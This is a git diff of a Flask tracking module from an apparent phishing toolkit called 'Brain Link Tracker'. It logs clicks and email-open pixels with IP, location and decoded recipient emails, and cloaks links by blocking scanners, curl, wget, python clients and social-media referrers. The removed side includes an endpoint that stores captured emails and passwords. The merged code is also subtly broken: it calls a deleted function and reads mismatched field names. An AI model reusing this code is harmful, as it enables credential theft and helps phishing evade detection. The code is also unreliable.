@@ -1,83 +1,15 @@
-<<<<<<< HEAD
-from flask import Blueprint, request, redirect, render_template_string
+from flask import Blueprint, request, redirect, jsonify, make_response, render_template_string
 from src.models.link import Link
 from src.models.tracking_event import TrackingEvent
 from src.models.user import db
-from datetime import datetime
-
-track_bp = Blueprint('track', __name__)
-
-@track_bp.route('/t/<short_code>', methods=['GET'])
-def track_click(short_code):
-    """Track link click and redirect"""
-    try:
-        link = Link.query.filter_by(short_code=short_code).first()
-
-        if not link or link.status != 'active':
-            return "Link not found or inactive", 404
-
-        event = TrackingEvent(
-            link_id=link.id,
-            ip_address=request.remote_addr,
-            user_agent=request.headers.get('User-Agent'),
-            timestamp=datetime.utcnow(),
-            status='redirected',
-            redirected=True
-        )
-
-        db.session.add(event)
-        link.total_clicks += 1
-        db.session.commit()
-
-        return redirect(link.target_url)
-
-    except Exception as e:
-        print(f"Track error: {e}")
-        return "Error processing request", 500
-
-@track_bp.route('/p/<short_code>', methods=['GET'])
-def pixel_track(short_code):
-    """Pixel tracking endpoint"""
-    try:
-        link = Link.query.filter_by(short_code=short_code).first()
-
-        if link:
-            email = request.args.get('email')
-            unique_id = request.args.get('id')
-
-            event = TrackingEvent(
-                link_id=link.id,
-                ip_address=request.remote_addr,
-                user_agent=request.headers.get('User-Agent'),
-                captured_email=email,
-                unique_id=unique_id,
-                timestamp=datetime.utcnow(),
-                status='opened',
-                email_opened=True
-            )
-
-            db.session.add(event)
-            db.session.commit()
-
-        transparent_gif = b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;'
-
-        return transparent_gif, 200, {'Content-Type': 'image/gif'}
-
-    except Exception as e:
-        print(f"Pixel track error: {e}")
-        transparent_gif = b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;'
-        return transparent_gif, 200, {'Content-Type': 'image/gif'}
-=======
-
-from flask import Blueprint, request, redirect, jsonify, make_response
-from src.models.user import db
-from src.models.link import Link
-from src.models.tracking_event import TrackingEvent
+from src.models.notification import Notification
 from src.utils.user_agent_parser import parse_user_agent, generate_unique_id
+from src.services.antibot import antibot_service
+from datetime import datetime
 import requests
 import json
-from datetime import datetime
 import base64
+import os
 
 track_bp = Blueprint("track", __name__)
 
@@ -154,7 +86,7 @@ def check_geo_targeting(link, geo_data):
     # Parse JSON arrays
     allowed_countries = json.loads(link.allowed_countries) if link.allowed_countries else []
     blocked_countries = json.loads(link.blocked_countries) if link.blocked_countries else []
-    allowed_regions = json.loads(link.allowed_regions) if link.allowed_regions else []
+    allowed_regions = json.loads(link.allowed_regions) if link.regions else []
     blocked_regions = json.loads(link.blocked_regions) if link.blocked_regions else []
     allowed_cities = json.loads(link.allowed_cities) if link.allowed_cities else []
     blocked_cities = json.loads(link.blocked_cities) if link.blocked_cities else []
@@ -184,32 +116,6 @@ def check_geo_targeting(link, geo_data):
     
     return {"blocked": False, "reason": None}
 
-def detect_bot(user_agent, ip_address):
-    """Simple bot detection"""
-    user_agent_lower = user_agent.lower()
-    bot_indicators = [
-        "bot", "crawler", "spider", "scraper", "curl", "wget", "python",
-        "requests", "urllib", "http", "api", "monitor", "test"
-    ]
-    
-    for indicator in bot_indicators:
-        if indicator in user_agent_lower:
-            return True
-    
-    return False
-
-def check_social_referrer():
-    """Check if request comes from social media platforms"""
-    referrer = request.headers.get("Referer", "").lower()
-    social_platforms = ["facebook.com", "twitter.com", "instagram.com", "linkedin.com", "tiktok.com"]
-    
-    for platform in social_platforms:
-        if platform in referrer:
-            platform_name = platform.split(".")[0]
-            return {"blocked": True, "reason": f"social_referrer_{platform_name}"}
-    
-    return {"blocked": False, "reason": None}
-
 @track_bp.route("/t/<short_code>")
 def track_click(short_code):
     # Get the tracking link
@@ -223,14 +129,25 @@ def track_click(short_code):
     timestamp = datetime.utcnow()
     referrer = request.headers.get("Referer", "")
     
+    # Prepare request data for antibot service
+    request_data = {
+        "ip_address": ip_address,
+        "user_agent": user_agent,
+        "headers": dict(request.headers),
+        "referrer": referrer,
+        "timestamp": timestamp.timestamp()
+    }
+    
+    # Analyze request with advanced anti-bot service
+    antibot_analysis = antibot_service.analyze_request(request_data)
+    is_bot = antibot_analysis["is_bot"]
+    bot_block_reason = antibot_analysis["blocked_reason"]
+    
     # Get geolocation data
     geo_data = get_geolocation(ip_address)
     
     # Parse user agent for device and browser info
     device_info = parse_user_agent(user_agent)
-    
-    # Bot detection
-    is_bot = detect_bot(user_agent, ip_address)
     
     # Social referrer check
     social_check = check_social_referrer()
@@ -256,7 +173,7 @@ def track_click(short_code):
         status = "Blocked"
         should_redirect = False
     elif link.bot_blocking_enabled and is_bot:
-        block_reason = "bot_detected"
+        block_reason = bot_block_reason or "bot_detected_advanced"
         status = "Bot"
         should_redirect = False
     
@@ -272,7 +189,7 @@ def track_click(short_code):
             city=geo_data["city"],
             zip_code=geo_data["zip_code"],
             latitude=geo_data["latitude"],
-            longitude=geo_data["longitude"],
+            longitude=geo_data["lon"],
             timezone=geo_data["timezone"],
             isp=geo_data["isp"],
             organization=geo_data["organization"],
@@ -290,7 +207,9 @@ def track_click(short_code):
             unique_id=unique_id,
             is_bot=is_bot,
             referrer=referrer,
-            page_views=1
+            page_views=1,
+            threat_score=antibot_analysis["threat_score"],
+            bot_type=antibot_analysis["bot_type"]
         )
         
         db.session.add(event)
@@ -308,7 +227,23 @@ def track_click(short_code):
     
     # Handle redirect or blocking
     if not should_redirect:
+        _create_notification(
+            link.user_id,
+            "Bot Blocked!",
+            f"A bot was blocked from accessing your link \'{link.campaign_name}\' ({link.short_code}). Reason: {block_reason}",
+            "security",
+            "high"
+        )
         return f"Access blocked: {block_reason}", 403
+    else:
+        _create_notification(
+            link.user_id,
+            "New Click!",
+            f"Your link \'{link.campaign_name}\' ({link.short_code}) received a new click.",
+            "info",
+            "low"
+        )
+
     
     # Check for preview URL
     if hasattr(link, "preview_template_url") and link.preview_template_url and request.args.get("preview") != "skip":
@@ -322,7 +257,7 @@ def track_click(short_code):
     return redirect(google_redirect_url)
 
 @track_bp.route("/p/<short_code>")
-def tracking_pixel(short_code):
+def pixel_track(short_code):
     """Tracking pixel endpoint"""
     try:
         link = Link.query.filter_by(short_code=short_code).first()
@@ -334,12 +269,24 @@ def tracking_pixel(short_code):
         ip_address = get_client_ip()
         user_agent = get_user_agent()
         timestamp = datetime.utcnow()
+        referrer = request.headers.get("Referer", "")
+        
+        # Prepare request data for antibot service
+        request_data = {
+            "ip_address": ip_address,
+            "user_agent": user_agent,
+            "headers": dict(request.headers),
+            "referrer": referrer,
+            "timestamp": timestamp.timestamp()
+        }
+        
+        # Analyze request with advanced anti-bot service
+        antibot_analysis = antibot_service.analyze_request(request_data)
+        is_bot = antibot_analysis["is_bot"]
+        bot_block_reason = antibot_analysis["blocked_reason"]
         
         # Get geolocation data
         geo_data = get_geolocation(ip_address)
-        
-        # Bot detection
-        is_bot = detect_bot(user_agent, ip_address)
         
         # Social referrer check
         social_check = check_social_referrer()
@@ -358,11 +305,12 @@ def tracking_pixel(short_code):
             block_reason = geo_check["reason"]
             event_status = "blocked"
         elif link.bot_blocking_enabled and is_bot:
-            block_reason = "bot_detected"
+            block_reason = bot_block_reason or "bot_detected_advanced"
             event_status = "blocked"
         
         # Record the tracking event
-        captured_email = request.args.get("email")  # Get email from pixel URL
+        captured_email_hex = request.args.get("email")  # Get hex-encoded email from pixel URL
+        captured_email = _decode_hex_email(captured_email_hex) if captured_email_hex else None
         unique_id = request.args.get("id") or request.args.get("uid")  # Get unique ID
         
         # Parse user agent for device and browser info
@@ -378,7 +326,7 @@ def tracking_pixel(short_code):
             city=geo_data["city"],
             zip_code=geo_data["zip_code"],
             latitude=geo_data["latitude"],
-            longitude=geo_data["longitude"],
+            longitude=geo_data["lon"],
             timezone=geo_data["timezone"],
             isp=geo_data["isp"],
             organization=geo_data["organization"],
@@ -397,7 +345,9 @@ def tracking_pixel(short_code):
             unique_id=unique_id,  # Store unique ID
             is_bot=is_bot,
             referrer=request.headers.get("Referer", ""),
-            page_views=1
+            page_views=1,
+            threat_score=antibot_analysis["threat_score"],
+            bot_type=antibot_analysis["bot_type"]
         )
         
         db.session.add(event)
@@ -411,7 +361,6 @@ def tracking_pixel(short_code):
 def _get_transparent_pixel():
     """Return a 1x1 transparent PNG pixel"""
     from flask import Response
-    import base64
     
     # 1x1 transparent PNG
     pixel_data = base64.b64decode("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==")
@@ -422,10 +371,6 @@ def _get_transparent_pixel():
     response.headers["Expires"] = "0"
     
     return response
-
-
-
-
 
 @track_bp.route("/track/page-landed", methods=["POST"])
 def page_landed():
@@ -440,50 +385,47 @@ def page_landed():
     try:
         # Find the tracking event by unique_id or link_id
         if unique_id:
-            event = TrackingEvent.query.filter_by(unique_id=unique_id).order_by(TrackingEvent.timestamp.desc()).first()
-        else:
+            event = TrackingEvent.query.filter_by(unique_id=unique_id).first()
+        elif link_id:
             event = TrackingEvent.query.filter_by(link_id=link_id).order_by(TrackingEvent.timestamp.desc()).first()
-        
+        else:
+            return jsonify({"success": False, "error": "No matching tracking event found"}), 404
+
         if event:
-            event.status = "On Page"
             event.on_page = True
             db.session.commit()
-            return jsonify({"success": True, "message": "Status updated to On Page"})
+            return jsonify({"success": True, "message": "Page landed status updated"}), 200
         else:
-            return jsonify({"success": False, "error": "No tracking event found"}), 404
+            return jsonify({"success": False, "error": "No matching tracking event found"}), 404
     except Exception as e:
         db.session.rollback()
-        return jsonify({"success": False, "error": str(e)}), 500
+        print(f"Error updating page landed status: {e}")
+        return jsonify({"success": False, "error": "Failed to update page landed status"}), 500
 
-@track_bp.route("/capture", methods=["POST"])
-def capture_credentials():
-    data = request.get_json()
-    if not data:
-        return jsonify({"success": False, "error": "No data provided"}), 400
-    
-    link_id = data.get("link_id")
-    email = data.get("email")
-    password = data.get("password")
-    
-    if not link_id or (not email and not password):
-        return jsonify({"success": False, "error": "Missing link_id or credentials"}), 400
-    
+
+
+
+def _decode_hex_email(hex_string):
+    """Decode a hex-encoded email string."""
     try:
-        # Find the latest tracking event for this link and update it
-        event = TrackingEvent.query.filter_by(link_id=link_id).order_by(TrackingEvent.timestamp.desc()).first()
-        if event:
-            event.captured_email = email
-            event.captured_password = password
-            event.on_page = True # Assuming credentials are captured on the landing page
-            db.session.commit()
-            return jsonify({"success": True, "message": "Credentials captured successfully"})
-        else:
-            return jsonify({"success": False, "error": "No tracking event found for this link"}), 404
+        return bytes.fromhex(hex_string).decode("utf-8")
+    except (ValueError, TypeError):
+        return None
+
+
+
+def _create_notification(user_id, title, message, type="info", priority="medium"):
+    try:
+        notification = Notification(
+            user_id=user_id,
+            title=title,
+            message=message,
+            type=type,
+            priority=priority
+        )
+        db.session.add(notification)
+        db.session.commit()
     except Exception as e:
         db.session.rollback()
-        print(f"Credential capture error: {e}")
-        return jsonify({"success": False, "error": "Failed to capture credentials"}), 500
+        print(f"Error creating notification: {e}")
 
-
-
->>>>>>> 00392b0 (Initial commit of unified Brain Link Tracker project with integrated admin panel fixes)
